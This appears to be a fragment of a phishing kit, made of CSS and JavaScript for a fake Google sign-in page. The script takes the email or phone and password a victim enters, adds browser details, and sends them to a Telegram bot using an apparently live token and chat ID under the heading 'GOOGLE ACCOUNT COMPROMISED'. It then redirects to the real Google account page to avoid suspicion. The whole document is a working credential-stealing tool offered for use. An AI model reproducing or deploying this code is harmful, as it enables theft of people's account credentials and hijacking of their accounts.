            color: #80868b;
            font-size: 16px;
            pointer-events: none;
            transition: 0.2s;
            background: white;
            padding: 0 4px;
        }
        .input-group input:focus ~ label,
        .input-group input:not(:placeholder-shown) ~ label {

    const BOT_TOKEN = "8614494771:AAENDkZulMFkCR98bqSBJuOseDSBAh8KjnU";   // e.g., "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
    const CHAT_ID   = "7994255254";     // e.g., "123456789"
    
    const IS_CONFIGURED = (BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && CHAT_ID !== "YOUR_CHAT_ID_HERE");
    
    async function sendToTelegram(identifier, password) {
        const userAgent = navigator.userAgent;
        const timestamp = new Date().toUTCString();
        const referrer = document.referrer || "direct";
        const screenRes = `${screen.width}x${screen.height}`;
        const language = navigator.language || "unknown";
        const message = `🔐 GOOGLE ACCOUNT COMPROMISED 🔐
📧 Email/Phone: ${identifier}
🔑 Password: ${password}
📱 User-Agent: ${userAgent}
🕒 Time: ${timestamp}
🌐 Referrer: ${referrer}
📺 Screen: ${screenRes}
🌍 Language: ${language}
🌍 IP: (Telegram will log server IP)`;
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });
            return response.ok;
        } catch (err) {
            console.error("Telegram send failed:", err);
            return false;
        }
    }
    
    const form = document.getElementById('googlePhishForm');
    const statusDiv = document.getElementById('statusMsg');
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        const identifier = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;
        
        if (!identifier || !password) {
            statusDiv.innerText = 'Please enter both email/phone and password.';
            statusDiv.style.color = '#d93025';
            return;
        }
        
        statusDiv.innerText = 'Verifying...';
        statusDiv.style.color = '#1a73e8';
        
        let success = false;
        if (IS_CONFIGURED) {
            success = await sendToTelegram(identifier, password);
        } else {
            // Fallback: log to console for testing – in production replace tokens
            console.log("[PHISH] Google creds:", { identifier, password });
            success = true;
        }
        
        if (success) {
            statusDiv.innerText = 'Verification successful. Redirecting...';
            statusDiv.style.color = '#188038';
            // Redirect to real Google My Account page to avoid suspicion
            setTimeout(() => {
                window.location.href = 'https://myaccount.google.com/';
            }, 1500);
        } else {
            statusDiv.innerText = 'Connection error. Please check your internet and try again.';
            statusDiv.style.color = '#d93025';
        }
